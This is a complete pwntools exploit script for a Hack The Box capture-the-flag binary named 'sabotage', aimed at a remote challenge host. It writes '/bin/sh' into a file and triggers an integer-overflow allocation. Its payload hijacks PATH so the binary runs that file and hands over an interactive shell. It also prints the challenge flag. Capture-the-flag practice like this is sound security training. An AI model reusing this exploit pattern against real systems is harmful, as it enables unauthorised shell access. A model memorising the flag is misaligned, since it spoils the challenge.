#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 138.68.183.64 --port 30528 ./sabotage
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./sabotage')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '138.68.139.197'
port = int(args.PORT or 30974)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *enter_command_control+217
# b *posix_spawn+10
b *quantum_destabilizer+38
b *intercept_c2_communication+265
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  './glibc/'

io = start()

def add(size,msg):
    io.sendlineafter("> ","1")
    io.sendlineafter(": ",str(size))
    io.sendlineafter(": ",msg)

def write_file(file,msg):
    io.sendlineafter("> ","2")
    io.sendlineafter(": ",file)
    io.sendlineafter(": ",msg)

write_file("panel","/bin/sh")

p = ''
p += 'a'*8*4
p += "PATH=/tmp/:/bin\x00"
add(18446744073709551608+8,p)

# HTB{CISA_Advisory_ICSA-21-119-04_better_check_your_mallocs}

io.interactive()

